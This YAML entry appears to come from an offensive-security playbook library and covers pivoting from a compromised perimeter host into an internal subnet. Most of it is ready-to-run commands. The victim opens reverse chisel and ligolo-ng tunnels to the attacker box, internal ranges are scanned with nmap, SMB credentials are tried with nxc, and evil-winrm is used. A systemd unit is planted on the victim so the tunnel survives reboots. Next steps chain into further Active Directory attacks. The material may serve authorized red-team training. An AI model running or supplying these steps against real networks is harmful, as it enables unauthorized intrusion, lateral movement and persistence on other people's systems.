id: pivoting-chisel-ligolo
name: "Pivoting — reverse tunnel through compromised host (chisel / ligolo-ng)"
description: >
  You popped a perimeter host and now need to reach an internal subnet
  that's not routable from your attacker box. Spin a reverse SOCKS or
  layer-2 tunnel through the foothold and stop fighting the firewall.
tags: [pivoting, tunneling, post-exploitation, networking]
difficulty: medium

inputs:
  - name: foothold_ip
    description: "IP you compromised (the host that has access to the internal subnet)."
    required: true
  - name: internal_cidr
    description: "Subnet you want to reach from your attacker box (e.g. 10.0.0.0/24)."
    required: true

steps:
  - id: pick_method
    name: "Pick the tunneling method"
    inline_command: "echo '— chisel: SOCKS5 proxy, easy, works for any TCP\n— ligolo-ng: full L3 tunnel (use any tool natively, no proxychains)\n— sshuttle: poor-man\\'s VPN if SSH access\n— socat: single-port forward when that\\'s all you need'"
    notes: |
      chisel is the safest default. ligolo-ng is more powerful (real L3
      tunnel) but needs root on the attacker side to create the TUN.
      sshuttle if you have SSH on the foothold — zero install on victim.

  - id: chisel_setup
    name: "chisel (SOCKS5 reverse tunnel)"
    inline_command: |
      # Attacker:
      ./chisel server --reverse --port 8000
      # Victim:
      ./chisel client <attacker_ip>:8000 R:1080:socks
      # Attacker — verify and use:
      curl --socks5 127.0.0.1:1080 http://<internal_ip>/
      # Then proxychains-ng:
      sed -i 's/socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains.conf
      proxychains4 nxc smb <internal_cidr> -u <user> -p <password>
    inputs:
      attacker_ip: "${attacker_ip}"
      internal_cidr: "${internal_cidr}"

  - id: ligolo_setup
    name: "ligolo-ng (full L3 tunnel — no proxychains)"
    inline_command: |
      # Attacker (one-time):
      sudo ip tuntap add user $USER mode tun ligolo
      sudo ip link set ligolo up
      sudo ip route add <internal_cidr> dev ligolo
      ./proxy -selfcert -laddr 0.0.0.0:11601
      # Victim:
      ./agent -connect <attacker_ip>:11601 -ignore-cert
      # Attacker — at the ligolo prompt:
      session
      start
      # Now use any tool natively:
      nmap -sV -p 445,3389 <internal_cidr>
      evil-winrm -i <internal_ip> ...
    inputs:
      attacker_ip: "${attacker_ip}"
      internal_cidr: "${internal_cidr}"

  - id: sshuttle_setup
    name: "sshuttle (poor-man's VPN over SSH)"
    inline_command: |
      sshuttle -r <user>@<foothold_ip> <internal_cidr>
      # Now any TCP/UDP to that subnet routes through the SSH tunnel.
    inputs:
      foothold_ip: "${foothold_ip}"
      internal_cidr: "${internal_cidr}"

  - id: validate_pivot
    name: "Verify reachability"
    inline_command: |
      # Pick a likely internal target and probe it:
      proxychains4 nmap -sT -Pn -n -p 22,80,443,445,3389 <internal_ip>
      # Or directly (if using ligolo / sshuttle):
      nmap -sT -Pn -n -p 22,80,443,445,3389 <internal_ip>

  - id: persistence_for_pivot
    name: "Keep the tunnel alive — systemd / scheduled task"
    inline_command: |
      # On the victim (long-running engagement), wrap the client in a
      # systemd unit / scheduled task so it survives reboots.
      # Example (Linux):
      sudo tee /etc/systemd/system/chisel-client.service <<'EOF'
      [Unit]
      Description=chisel client
      After=network-online.target
      [Service]
      ExecStart=/opt/chisel client <attacker_ip>:8000 R:1080:socks
      Restart=always
      [Install]
      WantedBy=multi-user.target
      EOF
      sudo systemctl enable --now chisel-client

references:
  - title: "chisel"
    url:   "https://github.com/jpillora/chisel"
  - title: "ligolo-ng"
    url:   "https://github.com/nicocha30/ligolo-ng"
  - title: "sshuttle"
    url:   "https://github.com/sshuttle/sshuttle"

next_chains:
  - chain: nmap-recon
    when:   'tunnel up'
    reason: 'Repeat recon — but now against the internal subnet.'
  - chain: smb-null-session-enum
    when:   'SMB open on an internal host'
    reason: 'Restart the AD attack tree against the internal network.'
